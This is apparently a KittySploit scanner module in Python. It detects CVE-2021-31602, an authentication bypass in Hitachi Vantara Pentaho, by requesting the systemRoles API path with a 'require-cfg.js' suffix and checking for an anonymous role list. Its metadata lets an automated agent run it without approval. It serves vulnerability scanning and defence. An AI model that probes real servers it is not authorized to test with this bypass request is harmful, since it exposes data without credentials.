#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hitachi Vantara Pentaho through 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass Detection',
        'description': 'Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence Server through 7.x are vulnerable to authentication bypass. The Security Model has different layers of Access Control. One of these layers is the applicationContext security, which is defined in the applicationContext-spring-security.xml file. The default configuration allows an unauthenticated user with no previous knowledge of the platform settings to extract pieces of information without possessing valid credentials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'spring', 'seclists', 'pentaho', 'auth-bypass', 'hitachi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2021/Nov/13',
            'https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software',
            'https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf',
            'https://www.hitachi.com/hirt/security/index.html',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31602',
        ],
        'cve': 'CVE-2021-31602',
    }

    def run(self):
        for path in ('/pentaho/api/userrolelist/systemRoles?require-cfg.js', '/api/userrolelist/systemRoles?require-cfg.js'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('<roleList>', '<roles>Anonymous</roles>',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

